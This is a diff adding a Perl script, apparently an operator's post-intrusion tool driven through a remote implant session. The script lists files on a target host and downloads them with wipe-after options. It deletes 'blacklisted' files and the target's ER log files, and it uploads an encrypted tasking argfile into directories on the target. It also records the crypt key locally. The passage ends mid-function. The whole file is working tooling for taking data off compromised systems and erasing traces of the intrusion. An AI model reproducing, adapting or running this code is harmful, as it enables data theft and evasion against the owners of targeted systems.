@@ -1,0 +1,1477 @@
+#!/usr/bin/env perl
+##
+$VER="2.0.0.23";
+$| = 1 ;
+
+
+#BUGGY: half the files did not end up in /tmp for packup
+
+@ourfilespulled = (1); # Appended to by nopengetfiles iff it is not empty,
+                       # so this is a cumulative list of all files pulled
+                       # via nopengetfiles() during this run.
+                       # (later we remove the dummy "1" entry via shift in 1, instance
+                       # and ignore it in the 2+, instances we read in).
+@remotepaths = ();     # Paths, possibly with wildcards, in which ER data is found.
+                       # E.g.: er*/aux_*/output/final
+@actionpaths = ();     # List of directories, one per start action we are tasking
+                       # (discovered from @remotepaths)
+
+myinit() ;
+
+# Log this key in a cryptkey file for this host
+$keyfile = makekeyfile();
+
+# Globals
+$logroot = "$optmp/er_logs/$nopen_rhostname";
+$collroot = "$optmp/er_coll/$nopen_rhostname";
+chomp($downroot = `find /current/down/er_* -type d | tail -1`);
+unless ($downroot =~ /$nopen_myip/) {
+  $downroot = "$opdown/er_".uc $projectname.".$nopen_rhostname";
+}
+`mkdir $downroot`;
+chomp($collcountbefore = `find $collroot -type f | wc -l`);
+chomp($logcountbefore = `find $logroot -type f | wc -l`);
+
+($countdone,$collcountafter,$collcountbefore,$newargfile,$encargfile,
+ $logcountafter,$logcountbefore) = ();
+# ASSERT: pulling data from global @remotepaths
+my @remotegetcdrhits = ();
+
+# @otherskipstrs is how we obfuscate "log" content on hosts we
+# do not have a hidden directory on.
+my @otherskipstrs = ("bb5e8");
+($output,$oldnopenlines,$nopenlines,@cdroutput,@tmp,
+ @oldcdroutput) = ();
+($outputl,$nopenlinesl,@cdroutputl) = ();
+my $cryptTool = "cryptTool";
+
+
+
+if ($mysplitpart == 1) {
+  foreach my $path (@remotepaths) {
+    # Remove the escape here we use quotes
+    ($output,$oldnopenlines,@tmp) =
+      nopenlss("-zFQ","$srcdir/$path");
+    my ($ans,$longans) = "";
+    if ($oldnopenlines =~ /OLD DATA/) {
+      my ($mins) = $oldnopenlines =~ /([\.\d+])/;
+      ($ans,$longans) = mygetinput
+	("A previous instance of $prog has populated a list of files on target\n".
+	 "as of $mins minutes ago matching your target path:\n\n".
+	 "   $srcdir/$path\n\n".
+	 "It is safe to <R>euse the old listing even if some of the files have\n".
+	 "been pulled, but best to <P>opulate a new listing if you know the data\n".
+	 "previously listed was completely downloaded/deleted.\n\n".
+	 "Do you want to <R>euse that old listing, <P>opulate a new one, or <ABORT>?",
+	 "P");
+      mydie("User aborted") if ($longans =~ /^abort/i);
+    }
+    unless ($ans eq "r") {
+      $oldnopenlines = "";
+      ($output,$nopenlines,@tmp) =
+	nopenlss("-UzFQ","$srcdir/$path");
+    }
+    my $timestr = gmtime();
+    # We save this output. Later may reuse if @cdroutput not populated on target.
+    unless ($host_output{"CDRS"}) {
+      # %host_output is not necessarily CDRs specific. Clear it if not used
+      # in previous autogetcdrhits.
+      undef %host_output;
+      newhostvar("host_output{CDRS}","CDRS\n");
+    }
+    newhostvar("host_output{$timestr}",
+	       "$path\n".
+	       join("\n",@tmp))
+      unless $oldnopenlines;
+    push(@cdroutput,@tmp);
+  }
+
+  if (!@cdroutput) {
+#    if (keys %host_output and $host_output{"CDRS"}) {
+#      my ($s,$have,$each,$are) = ("","has","it","is");
+#      # For plural, do not count the "CDRS" one.
+#      if (keys %host_output > 2) {
+#	$s = "s";
+#	$have = "have";
+#	$each = "each";
+#	$are = "are";
+#      }
+#      my ($moreprompt,$moreprompt2,$remaining) = ();
+#      my %usethese = ();
+#      while (1) {
+#	my ($default,$count,$prompt) = ();
+#	my @allowed = ("abort","done",
+#		       "ABORT","DONE",
+#		      );
+#	$moreprompt2 = "\n\n";
+#	foreach (sort keys %host_output) {
+#	  dbg("Looping over host_output on line=$_=");
+#	  next if (/^CDRS/);
+#	  next if $usethese{$_};
+#	  my ($path) = split(/\n/,$host_output{$_});
+#	  push(@allowed,$_);
+#	  $count++;
+#	  $prompt .= "   $_     $path\n";
+#	  # Default is first sorted, or oldest
+#	  $default = $_ unless $default;
+#	}
+#	# They can choose a second listing if they want to combine the two, but
+#	# default is to use one and then DONE.
+#	$default = "DONE" if (keys %usethese);
+#	last unless $prompt;
+#	my ($ans,$longans) = mygetinput
+#	  ($moreprompt2.
+#	   "There is currently no data to find remotely in the path(s) provided.\n\n".
+#	   "However, $count previous instance$s of $prog $have done remote listings.\n".
+#	   "What path at what time are listed here:\n\n".
+#	   $prompt."\n".
+#	   "The time$s $each$remaining was done and the path thereon $are listed above.\n\n".
+#	   "Paste in the complete timestamp, day through year, of the one you want to use\n".
+#	   "(defaults to the oldest one) to proceed with packing up your data, or you can <ABORT>.\n\n".
+#	   $moreprompt.
+#	   "Enter ABORT, a timestamp, or DONE:",
+#	   $default,@allowed
+#	  );
+#	$moreprompt2 = "\n\n";
+#	mydie("User aborted") if ($longans =~ /^abort/i);
+#	last if ($longans =~ /^\s*done/i);
+#	$remaining = " one remaining";
+#	# Strip begin/end spaces.
+#	($longans) = $longans =~ /\s*(\S.*\S)\s*/;
+#	unless ($host_output{$longans}) {
+#	  $moreprompt = "\n$COLOR_FAILURE\nINVALID ANSWER: $longans\n$COLOR_NORMAL\n";
+#	  next;
+#	}
+#	$usethese{$longans}++;
+#	$moreprompt = "Enter another time if you want to combine another previous listing.\n\n";
+#      }
+#      @remotepaths = ();
+#      foreach (keys %usethese) {
+#	my ($path,@listing) = split(/\n/,$host_output{$_});
+#	push(@cdroutput,@listing);
+#	push(@remotepaths,$path);
+#      }
+#    }
+    mydie("There are no files in @remotepaths")
+      unless ($collcountbefore or $logcountbefore or @cdroutput);
+    unless (@cdroutput) {
+      my ($ans) = mygetinput
+	($COLOR_FAILURE."No data files remain on target.\n\n".$COLOR_NORMAL.
+	 "However, previously you collected files in one of:\n".
+	 "      $collroot   ($collcountbefore files)\n".
+	 "OR    $logroot   ($logcountbefore files)\n\n".
+	 "Do you want to pack those up now?",
+	 "Y"
+	);
+      mydie("OK, then there is nothing more to do")
+	unless ($ans eq "y");
+      packitup(1);
+      exit;
+    }
+    offerabort(".\n\n".
+	       join("\n",@cdroutput)."\n\n".
+	       "About to reprocess the files listed above. Those already downloaded will not\n".
+	       "be downloaded again, but they will be copied into $collroot.\n".
+	       "This will allow previously downloaded files that were not processed\n".
+	       "(which includes testing decryption at least once and preparing the files\n".
+	       "for upload in a tarball).\n\n");
+    tickleifneedbe(0,0,60);	# Run something once a minute on target
+  }
+}
+dbg("skipexpr=$skipexpr= BEFORE (@cdroutput)");
+my $lessfiles = "";
+my $skipfiles = "";
+
+my @cdroutputskipped = ();
+if ($mysplitpart == 1) {
+  if ($skipexpr) {
+    @cdroutputskipped = grep /$skipexpr/ , @cdroutput;
+
+    foreach my $otherskip (@otherskipstrs) {
+      my @otherskip = grep /$otherskip/ , @cdroutput ;
+      if (@otherskip) {
+	my ($ans,$longans) = mygetinput
+	  ("You asked to blacklist \"$skipexpr\" files, but$COLOR_FAILURE NONE WERE FOUND\n".
+	   "$COLOR_NORMAL.\n\n".
+	   "There were, however, files containing \"$otherskip\", which is sometimes\n".
+	   "used to indicate log files (depending on the target).\n\n".
+	   "Do you want to change your blacklist argument from \"$skipexpr\" to \"$otherskip\"?",
+	   "Y"
+	  );
+	if ($ans eq "y") {
+	  $skipexpr = $otherskip;
+	  @cdroutputskipped = @otherskip;
+	  # Skip other prompt below via $nevermind++
+	  $nevermind++;
+	  last;
+	}
+      }
+    }
+    unless (@cdroutputskipped) {
+      my ($ans,$longans) = mygetinput
+	("You asked to blacklist \"$skipexpr\" files, but$COLOR_FAILURE NONE WERE FOUND\n".
+	 "$COLOR_NORMAL.\n\n".
+	 "If you want to try some other blacklist string, enter it here, or\n".
+	 "type \"ABORT\" to stop $prog entirely. If you enter nothing at all,\n".
+	 "no blacklist will be used.\n\n".
+	 "Enter your new blacklist, \"ABORT\", or nothing:"
+	);
+      mydie("Aborted by user")
+	if ($longans =~ /^\s*abort/i);
+      if ($longans and $longans ne "nothing") {
+	$skipexpr = $longans;
+	@cdroutputskipped = grep /$skipexpr/ , @cdroutput;
+      }
+    }
+  }
+dbg("cdroutputskipped=(\n".
+    join("\n",@cdroutputskipped)."\n)\n");
+  if (my $skipcount = @cdroutputskipped) {
+    $skipfiles = join("\n",@cdroutputskipped)."\n\n";
+    @cdroutput = grep !/$skipexpr/ , @cdroutput;
+    dbg("  \@cdroutput = grep ! /$skipexpr/ , \@cdroutput;");
+    $lessfiles = "After blacklisting \"$skipexpr\" (skipping $skipcount), files now include:\n".
+      join("\n",@cdroutput)."\n\n";
+  } else {
+    $lessfiles = "${COLOR_FAILURE}No files were skipped, none matched \"$skipexpr\".\n".
+      "$COLOR_NORMAL\n"
+	if $skipexpr;
+  }
+  my $problem = handleargfiles();
+  if ($problem) {
+    offerabort($problem."\n\n".$COLOR_NORMAL);
+  }
+}
+
+mydie("Argfile tasking is complete.")
+  if ($taskonly);
+
+# Populate list we pull/rm
+my @getlist = ();
+my @completelist = ();
+# Populate @getlist based on -sN,M split or not
+my $getcount = 0;
+my $nopulls = 0;
+if ($mysplitpart == 1) {
+  foreach (@cdroutput) {
+#    if (m,.* \d\d:\d\d \d\d\d\d (/.*),) {
+    if (m,-.*\s+(\d+)\s+(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec).*\d{4}\s+(/.*)$,) {
+      my ($size,$month,$path) = ($1,$2,$3);
+      push (@getlist,$path);
+      push (@completelist,$_);
+    }
+  }
+  my $totalfilecount = @completelist;
+  $splitcount = 1 unless $splitcount;
+  $splitcount = minof($splitcount,$totalfilecount)
+    if ($splitcount);
+  if (!$totalfilecount and $skipfiles) {
+    $splitcount = 1;
+    offerabort
+      ("You blacklisted \"$skipexpr\" files, and after ignoring\n".
+       "those, there are no files to collect. If you want to download\n".
+       "and decrypt the blacklisted files, abort here and re-run the same\n".
+       "command less any blacklist option.");
+    $nopulls++;
+  } else {
+    mydie("Cannot proceed, bug: splitcount=$splitcount= mysplitpart=$mysplitpart= totalfilecount=$totalfilecount=")
+      unless ($splitcount > 0);
+  }
+
+  my $counteach = int(0.50 + (@completelist / $splitcount));
+
+  if ($splitcount > 1) {
+    my @countlist = sortlistingonsize(@completelist);
+    # Clear @getlist, we start over here with the splitting of @countlist
+    @getlist = ();
+    # we populate each split by alternating one of the top (smallest) and bottom (largest)
+    # until we exhaust them all. This way, each split has about the same number of bytes to it.
+    my $dobottom = 0;
+    for (my $parti=1;$parti<=$splitcount;$parti++) {
+      if (open(CDROUT,">$optmp/getcdrhits.$nopen_rhostname.$parti.of.$splitcount")) {
+	my $count = $counteach;
+	while ($count and @countlist) {
+	  my $str = "";
+	  if ($dobottom) {
+	    $str = shift @countlist;
+	  } else {
+	    $str = pop @countlist;
+	  }
+	  print CDROUT "$str\n";
+	  $dobottom = ! $dobottom;
+	  $count--;
+	}
+	close(CDROUT);
+      }
+    }
+    mydie("This is bad, finished $splitcount files, still have ".scalar @countlist."\n".
+	  "entries left in completelist:\n\n".
+	  `ls -al $optmp/getcdrhits.$nopen_rhostname.*.of.$splitcount`."\n\n".
+	  "completelist = (".
+	  "\n                ".join("\n                ",@countlist).
+	  "\n               )")
+      if (@countlist);
+  }
+}
+
+if ($splitcount > 1 and $mysplitpart == 1) {
+  my $cmd = "-gs getcdrhits $origargs";
+  my $cmds = "";
+  $cmd =~ s/-s\s*(\d+),/-s III,/;
+  for ($i=2;$i<=$splitcount;$i++) {
+    $cmds .= "  $cmd\n";
+    $cmds =~ s/III,/$i,/;
+  }
+  `rm $optmp/DONE.getcdrhits.$nopen_rhostname* 2>/dev/null`;
+  offerabort(#"splitcount=$splitcount= mysplitpart=$mysplitpart=".
+	     "If you are ready to continue with all $splitcount instances,\n".
+	     "here are pastables for your other ".int($splitcount - 1)." instances:\n\n".
+	     $cmds."\n\n".
+	     "If not, you can abort here (and not run the pastables).\n"
+	    );
+}
+
+# ASSERT: At this point, either @getlist is full and we are part 1 of 1, or
+# @getlist is empty and we populate our @getlist from $taskfile.
+
+if (!@getlist) {
+  # In -s N,M mode, we have to populate @getlist and @cdroutput from the $i.of.M file.
+  my $sleepcount=0;
+  my ($lastfilesize,$filesize,$samecount) = ();
+  my $taskfile = "$optmp/getcdrhits.$nopen_rhostname.$mysplitpart.of.$splitcount";
+  # Parts 2+ must wait here until their tasking is written.
+  while ($mysplitpart > 1) {
+    sleep 1;
+    if (-e "$optmp/abortcdrhits.$nopen_rhostname.$mysplitpart.of.$splitcount") {
+      unlink("$optmp/abortcdrhits.$nopen_rhostname.$mysplitpart.of.$splitcount");
+	mydie("User aborted");
+    }
+    $filesize = -s $taskfile;
+    tickleifneedbe(0,0,60); # Run something once a minute on target
+    if ($sleepcount % 20 == 0) {
+      progprint("Waiting on part 1 of $splitcount to build tasking for this instance\n".
+		"($optmp/getcdrhits.$nopen_rhostname.$mysplitpart.of.$splitcount).\n\n".
+		"Touch this file to abort:  touch $optmp/abortcdrhits.$nopen_rhostname.$mysplitpart.of.$splitcount");
+    }
+    $sleepcount++;
+    if ($filesize > 0) {
+      dbg("taskfile there: \n".
+	  `ls -al $taskfile`.
+	  "file size now:  $filesize=\n".
+	  "last file size: $lastfilesize=\n".
+	  "samecount=$samecount=");
+      unless ($lastfilesize > 0) {
+	$lastfilesize = $filesize;
+	next;
+      }
+      # Sleep a bit more, make sure 
+      last if ($filesize == $lastfilesize and ($samecount++ > 1));
+    }
+  }
+  if (open(CDRIN,$taskfile)) {
+    @cdroutput = ();
+    while (<CDRIN>) {
+      chomp;
+      next if /^\s*\#/;
+      if (m,.* \d\d:\d\d \d\d\d\d (/.*),) {
+	push (@getlist,$1);
+	push (@cdroutput,$_);
+      }
+    }
+    mydie("No tasking in $optmp/getcdrhits.$nopen_rhostname.$mysplitpart.of.$splitcount")
+      unless @getlist;
+    progprint($COLOR_NORMAL.
+	      $lessfiles."\n\n".
+	      "Just read in session $mysplitpart of $splitcount tasking from \n".
+	      "  $optmp/getcdrhits.$nopen_rhostname.$mysplitpart.of.$splitcount:\n\n   ".
+	      join("\n   ",@getlist));
+    $lessfiles = "";
+  } else {
+    mydie("Cannot open $optmp/getcdrhits.$nopen_rhostname.$mysplitpart.of.$splitcount")
+      unless $nopulls;
+  }
+}
+
+my $totalpullsize = 0;
+foreach (@cdroutput) {
+    $totalpullsize += $1
+	if (/\s(\d+)\s+(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s+\d+\s+\d\d:/);
+}
+$totalpullsize = int(100*$totalpullsize / 1024 / 1024)/100;
+
+my $splitmore = "";
+$splitmore = " (part $mysplitpart of $splitcount)"
+  if ($splitcount > 1);
+
+$getcount = @getlist;
+if ($nopulls) {
+  offerabort
+    ($lessfiles."\n   ".
+     "There are no fiiles to pull. We will continue with the\n".
+     "log cleaning if there is any.".
+     "");
+} else {
+  offerabort
+    ($lessfiles."\n   ".
+     join("\n   ",@getlist)."\n\n".
+     "$prog$splitmore is about to download and/or delete the $getcount files above,\n".
+     "with a total size of $totalpullsize MB".
+     "");
+}
+# Why was this FORCEREGET on? I forget. 20100708
+#nopengetfiles("FORCEREGETNOBUILTINRMLISTIS-lsWIPEAFTERWITHOUTPROMPT",@cdroutput);
+nopengetfiles("$bwmax${forcereget}NOBUILTINRMLISTIS-lsWIPEAFTERWITHOUTPROMPT",@cdroutput);
+
+# ASSERT: nopengetfiles() now populates @nopengotfiles (if it is nonempty),
+# giving us a complete list of full paths of files pulled this run-through.
+
+## Loop makes sure rm line does not get too big.
+#my $list="";
+#while (@getlist) {
+#  $list .= shift @getlist;
+#  $list .= " " ;
+#  if (length $list > 1500) {
+#    doit("rm $list");
+#    $list="";
+#  }
+#}
+#doit("rm $list") if $list;
+
+# Only run this if skipexpr was defined.
+# NOTE: Only first instance if -s N,M is used will have @cdroutputskipped populated
+if ($skipexpr and @cdroutputskipped) {
+# Populate list to rm blacklisted file with prompt
+  my @skiplist = ();
+  foreach (@cdroutputskipped) {
+    push (@skiplist,$1)
+      if m,.* \d\d:\d\d \d\d\d\d (/.*),;
+  }
+
+  offerabort
+    ($skipfiles.
+     "$prog is about to delete the blacklisted (and not downloaded) files listed above.".
+     "") ;
+
+
+  # Loop makes sure rm line does not get too big.
+  my $listskip="";
+  while (@skiplist) {
+    $listskip .= shift @skiplist;
+    $listskip .= " " ;
+    if (length $listskip > $nopenmaxcommandlength) {
+      doit("rm $listskip");
+      $listskip="";
+    }
+  }
+  doit("rm $listskip") if $listskip;
+}
+
+# Pulling the ER logs from disk, but only in master 1,M instance
+if ($mysplitpart == 1) {
+  foreach my $pathlog (@remotelogpath) {
+    # Remove the escape here we use quotes
+    ($outputl,$nopenlinesl,@tmp) =
+      nopenlss("-UzFQ","$srcdir/$pathlog");
+    $pathlog = "\"$pathlog\"" if $pathlog =~ /\s/;
+    push (@cdroutputl,@tmp);
+  }
+
+  if (@cdroutputl) {
+    my $logfiles = join("\n",@cdroutputl)."\n\n";
+    # Populate list we pull/rm
+    my @getlistl = ();
+    foreach (@cdroutputl) {
+  #$COLOR_SUCCESS="\033[2;32m";
+  #$COLOR_FAILURE="\033[2;31m";
+  #$COLOR_WARNING="\033[1;33m";
+  #$COLOR_NORMAL="\033[0;39m";
+  #$COLOR_NOTE="\033[0;34m";
+      # Remove colors
+      s,\033\[\d+;\d+m,,g;
+      push (@getlistl,$1)
+	if m,.* \d\d:\d\d \d\d\d\d (/.*),;
+    }
+
+    my ($ans,$longans) = mygetinput
+      ("NOTE: This is the first of two questions.\n".
+       "      The default in the NEXT question will be YES for delete\n".
+       "      WITHOUT downloading, which is the norm. Hence, the norm for\n".
+       "      this question, download AND delete, is No.\n\n".
+       "Do you want to DOWNLOAD$COLOR_FAILURE and$COLOR_NORMAL delete the ER log files listed above?",
+       "N"
+      );
+
+    unless ($ans eq "n") {
+      nopengetfiles("$bwmax${forcereget}LISTIS-lsWIPEAFTERWITHOUTPROMPT",@cdroutputl);
+    } else {
+      ($ans,$longans) = mygetinput
+	($logfiles.
+	 "Do you want to delete the ER log files listed above?",
+	 "Y"
+	);
+      unless ($ans eq "n") {
+	# Loop makes sure rm line does not get too big.
+	my $loglist="";
+	while (@getlistl) {
+	  $loglist .= shift @getlistl;
+	  $loglist .= " " ;
+	  if (length $loglist > $nopenmaxcommandlength) {
+	    doit("rm $loglist");
+	    $loglist="";
+	  }
+	}
+	doit("rm $loglist") if $loglist;
+      }
+    }
+  }
+}
+
+
+if ($mysplitpart > 1) {
+  if (open(CDROUT,">$optmp/DONE.getcdrhits.$nopen_rhostname.$mysplitpart.of.$splitcount")) {
+    foreach (@ourfilespulled) {
+      print CDROUT "$_\n";
+    }
+    print CDROUT "# ".gmtime()."\n";
+    close(CDROUT);
+  } else {
+    mydie("Part $mysplitpart of $splitcount is done, but it could not write\n".
+	  "to $optmp/DONE.getcdrhits.$nopen_rhostname.$mysplitpart.of.$splitcount\n\n".
+	  "This is bad, get help.");
+  }
+  mydie("Part $mysplitpart of $splitcount is done. Part 1 will now pack up the data.")
+    if ($splitcount == 2);
+  mydie("Part $mysplitpart of $splitcount is done. Part 1 will pack up the data\n".
+	"once all the other parts are done.");
+} else {
+  my $sleepcount = 0;
+  unlink("$optmp/CONTINUE.getcdrhits.$nopen_rhostname");
+  while ($splitcount > 1) {
+    tickleifneedbe(0,0,60); # Run something once a minute on target
+    my $alldone = 1;
+    sleep 1;
+    for ($parti=2;$parti<=$splitcount;$parti++) {
+      $alldone = 0
+	unless (-f "$optmp/DONE.getcdrhits.$nopen_rhostname.$parti.of.$splitcount");
+    }
+    last if ($alldone);
+    my $more = "\n\n(You can skip waiting for them if something is wrong with this:\n\n".
+      " touch $optmp/CONTINUE.getcdrhits.$nopen_rhostname\n\n".
+      " (ALERT someone if that is the case though.)\n\n"
+	if ($sleepcount > 122);
+    my $more2 = `ls -al $optmp/DONE.getcdrhits.$nopen_rhostname*`;
+    progprint($COLOR_FAILURE.
+	      "\n\n".$more.$COLOR_NORMAL.
+	      "Part 1 of $splitcount is waiting for the other parts to finish.\n\n".
+	      "A \"w\" will be done every minute until then to keep this window alive.\n\n".
+	      $more2)
+      unless ($sleepcount % 120);
+    $sleepcount++;
+    last if (-f "$optmp/CONTINUE.getcdrhits.$nopen_rhostname");
+  }
+  unlink("$optmp/CONTINUE.getcdrhits.$nopen_rhostname");
+}
+
+
+# ASSERT: We are $mysplitpart == 1 and all other instances (if any) are done
+packitup() ;
+
+while (@actionpaths) {
+  my $erpath = shift(@actionpaths);
+  doit("-ls -R $erpath");
+  if (@actionpaths) {
+    mygetinput("Above is the $erpath directory tasked earlier, shown here so you\n".
+	       "can confirm if any new hits have shown up or not.\n\n".
+	       "Hit enter to see the next one.");
+  } else {
+    progprint("Above is the $erpath directory tasked earlier, shown here so you\n".
+	      "can confirm if any new hits have shown up or not.");
+  }
+}
+
+exit 1;
+
+sub handleargfiles {
+  my @argfiles = ();
+#TODO: Why is this failing?
+#  my @tmp = findfilematching("argfile","f");
+  my  @tmp = split(/\n/,`find /current/ /mnt/zip -type f 2>/dev/null | grep argfile`);
+  if (@tmp) {
+    # Put this project entries earlier in array, eliminate any enc files.
+    @tmp =  grep ! /enc$/, @tmp;
+    my @tmp2 = grep  /$projectname/i, @tmp;
+    @argfiles = grep /(forward|fwd)/, @tmp2;
+    push(@argfiles, grep ! /(forward|fwd)/, @tmp2);
+    push(@argfiles, grep ! /$projectname/i, @tmp)
+  }
+  my $default = $argfiles[0];
+  my $listing = "";
+  if (@argfiles) {
+    my @last  = grep  /$projectname/i, @argfiles;
+    my @first = grep  !/$projectname/i, @argfiles;
+    $listing = `find @first -type f -ls | lss | sed "s/.*root //g"`
+      if @first;
+    $listing .= `find @last -type f -ls | lss | sed "s/.*root //g"`
+      if @last;
+  }
+  $default = "none" unless $default;
+  my ($ans,$longans,$count,$more,$more2);
+  while (!$newargfile and $longans ne "none") {
+    $more = "\n$COLOR_FAILURE\nINVALID RESPONSE\n$COLOR_NORMAL\n"
+      if $count++;
+    ($ans,$longans) = mygetinput
+      ($listing."\n\n".$more.
+       "If there is a fresh argfile to upload, enter it here (the$COLOR_FAILURE .txt$COLOR_NORMAL one).\n\n".
+       "If you need to abort now and re-try this later, enter$COLOR_FAILURE ABORT$COLOR_NORMAL.\n\n".
+       "If there is no tasking to do, answer$COLOR_FAILURE NONE$COLOR_NORMAL.\n\n".
+       "Argfile to use ($prog will encrypt it)\n",$default
+      );
+    mydie("User aborted") if ($longans =~ /^abort/i);
+    return if ($longans =~ /^none/i);
+    $more2 = "";
+    $newargfile = $longans
+      if ($longans ne "none" and -f $longans);
+    if ($newargfile) {
+      #      $newargfile = s,/+,/,g;
+      dbg("longans=$longans=
+newargfile=$newargfile=
+newfile=$newfile=");
+      my $bn = basename($newargfile);
+      my $newfile = "$downroot/$bn";
+      unless ($newfile eq $newargfile) {
+	preservefile($newfile);
+	copy($newargfile,$newfile);
+	$newargfile = $newfile;
+      }
+      `dos2unix $newargfile`;
+      chomp(my $test = `file $newargfile | grep -iv ascii`);
+      chomp(my $test2 = `sort $newargfile > $newargfile.sorted ; file $newargfile.sorted | grep -iv ascii ; rm $newargfile.sorted`)
+	if $test;
+      if ($test and $test2) {
+	$more2 = "\n$COLOR_FAILURE\nFILE IS NOT ASCII: $test\n$COLOR_NORMAL\n";
+	unlink($newargfile);
+	$newargfile = "";
+	next;
+      }
+      progprint("Copied $longans to $newargfile, dos2unix'd it if need be:\n\n".
+		`ls -al $longans $newargfile | sort -u`."\n".
+		`file $longans $newargfile | sort -u`."\n");
+
+      $encargfile = $newargfile;
+      $encargfile =~ s/\.txt//;
+      $encargfile .= ".enc" unless ($encargfile =~ /\.enc$/);
+      my $cmd = "$cryptTool -i $newargfile -o $encargfile -k $cryptkey -b 2>&1";
+      progprint($COLOR_NORMAL."\n\n".
+		"Encrypting argfile with:\n  $cmd\n\n".
+		`$cmd`);
+      mydie("Encrypting argfile failed, $encargfile does not exist")
+	unless (-f $encargfile);
+      chomp($test = `file $encargfile | grep -vi "data\$"`);
+      if ($test) {
+	offerabort($COLOR_FAILURE."\n\nENCRYPTION MAY HAVE FAILED:\n$COLOR_NORMAL\n".
+		   "file $encargfile\n".
+		   $test."\n\n".
+		   "You should probably abort.","ABORT");
+      }
+    }
+  }
+  return unless ($newargfile and $encargfile);
+  my ($tmppath,$longlist,$output,$nopenlines,@list,@tmp) = ();
+  foreach my $path (@remotepaths) {
+    # Remove the escape here we use quotes
+    $path =~ s,\*.*,\*,;
+    # We force $path to have a / in there near the beginning, even if ./
+    $path = "./$path" unless ($path =~ m,^/,);
+    ($output,$nopenlines,@tmp) =
+      doit("-ls -d $path");
+    foreach (@tmp) {
+      s,.*root ,,;
+      push (@list,$_);
+      s,.*\s\d\d\d\d\s((\.*)/),\1,;
+#Do not use spaces
+#      $_ = "\"$_\"" if  (/\s/);
+      push(@actionpaths,$_);
+      $tmppath = dirname($_);
+    }
+  }
+  $tmppath = "." if (!$tmppath);
+  my $default = "";
+  ($default) = grep /erf/,@actionpaths;
+  $default = $actionpaths[0] unless (length $default);
+  my $ies = "ies";
+  $ies = "y" unless (@actionpaths > 1);
+  ($ans,$longans) = mygetinput
+    ("Start action director$ies found:\n".
+     #"tmppath=$tmppath=\n".
+     join("   \n",@list)."\n\n".
+     "Argfile has been encrypted:\n\n".
+     `ls -al $downroot/argfile.$nopen_rhostname* 2>&1 | grep -v enc`.
+     `ls -al $downroot/argfile.$nopen_rhostname* 2>&1 | grep enc`."\n\n".
+     `file $downroot/argfile.$nopen_rhostname* 2>&1 | grep -v enc`.
+     `file $downroot/argfile.$nopen_rhostname* 2>&1 | grep enc`."\n\n".
+"\n\n\n
+actionpaths[0]=$actionpaths[0]=
+dbg: default=$default=\n\n\n".
+     "Which start action directories do you want to upload the new argfile to\n".
+     "(enter them, directory name only, space delimited, or enter \"all\")?",
+     $default
+    );
+
+  mydie("User aborted")
+    if (lc $longans eq "abort");
+  
+  unless ($longans eq "all") {
+    @actionpaths = split(/\s+/,$longans);
+  }
+  my $eachof = " each of"
+    if (@actionpaths > 1);
+#offerabort("tmppath=$tmppath= Uploading once to $tmppath, then copying to$eachof (@actionpaths).");
+
+  ($output,$nopenlines,@output)
+    = doit("-put $encargfile $tmppath/$argname");
+dbg("output=$output=");
+#TODO: This test failed
+#  mydie("\n\nUpload of argfile failed, you have cleanup to do.")
+#    unless ($output =~ m,-.* $tmppath/$argname$,);
+  my ($newname) = ($argname);
+  if ($argname =~ /(\d)$/) {
+    $newname =~ s,\d$,,;
+  }
+  foreach my $path (sort @actionpaths) {
+    unless ($path =~ /^\S+/) {
+      progprint("$COLOR_FAILURE\n\nRefusing to use path=$path=!!!!\n\n".
+		"Would result in cp $tmppath/$argname $path/$newnameN");
+      sleep 5;
+      next;
+    }
+    my ($list,$ext) = ();
+    my ($moreerr,@actiondests) = ();
+    while (1) {
+      my ($ans,$longans) = mygetinput
+	($moreerr.
+	 "How many different start actions are in $path (i.e., how many copies of\n".
+	 "adm1 need to be put in $path, adm1 ... admN)?",1
+	);
+      mydie("User aborted") if (lc $longans eq "abort");
+      if ($longans !~ /^\d+$/ or
+	  $longans < 1) {
+	$moreerr = "$COLOR_FAILURE\n\nINVALID ANSWER: $longans\n\n";
+	next;
+      }
+      for (my $i=1;$i<=$longans;$i++) {
+	push(@actiondests,$i);
+      }
+      last;
+    }
+    my $dowhat = "";
+    foreach my $ext (@actiondests) {
+      $dowhat .= " ; " if $dowhat;
+      $dowhat .= "cp $tmppath/$argname $path/$newname$ext";
+      $longlist .= " $path/$newname$ext";
+      $list .= " $path/$newname$ext";
+    }
+    ($output,$nopenlines,@output)
+      = doit("$dowhat ; ls -al $list");
+  }
+  doit("-rm $tmppath/$argname");
+
+  progprint("Sleeping 5s, see if they are gone yet....");
+  sleep 5;
+  ($output) = doit("-ls $longlist");
+  if ($output) {
+    ($output) = doit("-ls $longlist");
+    progprint($COLOR_FAILURE."\n\nOne or more argfiles is still there, check again later")
+      if ($output);
+    sleep 7;
+  }
+  return "\n$COLOR_FAILURE\n$output\n\n".
+    "One or more argfiles is still there, something is likely wrong with ER.\n\n".
+    "Press return to continue." if $output;
+  return "";
+}
+
+sub makekeyfile {
+  return unless ($cryptkey);
+  my ($sec,$min,$hr,$mday,$mon,$year,$wday,$yday,$isdst,$monstr) =
+    gmtime();
+  $monstr = $mons[$mon];
+  my $ext = sprintf("%02d%3s%04d",$mday,$monstr,$year);
+  my $keyfile = "$downroot/cryptkey.$nopen_rhostname.enemyrun.$ext";
+  open(KEYOUT,">$keyfile");
+  print KEYOUT "$cryptkey\n";
+  close(KEYOUT);
+  return $keyfile;
+}
+
+sub packitup {
+  local ($forcepack) = (@_);
+  my ($countpulledbefore) = ();
+  $countpulledbefore = $collcountbefore + $logcountbefore;
+  newhostvar("host_dirpushed{$logroot}",0)
+    unless $host_dirpushed{$logroot};
+  newhostvar("host_dirpushed{$collroot}",0)
+    unless $host_dirpushed{$collroot};
+  # We toss the dummy entry of "1" that we first put in here.
+  shift @ourfilespulled if ($ourfilespulled[0] eq "1");
+  if ($splitcount > 1) {
+    for ($parti=2;$parti<=$splitcount;$parti++) {
+      if (open(CDRIN,"$optmp/DONE.getcdrhits.$nopen_rhostname.$parti.of.$splitcount")) {
+	while (<CDRIN>) {
+	  chomp;
+	  next if /^\s*\#/;
+	  next if ($_ eq "1");
+	  push (@ourfilespulled,$_);
+	}
+	close(CDRIN);
+      }
+      unlink("$optmp/DONE.getcdrhits.$nopen_rhostname.$parti.of.$splitcount");
+    }
+  }
+  my $srcroot = "$opdown/$nopen_rhostname";
+  my (%oldfilespulled) = ();
+ #Never used this:
+#  foreach my $line (@oldcdroutput) {
+#    chomp;
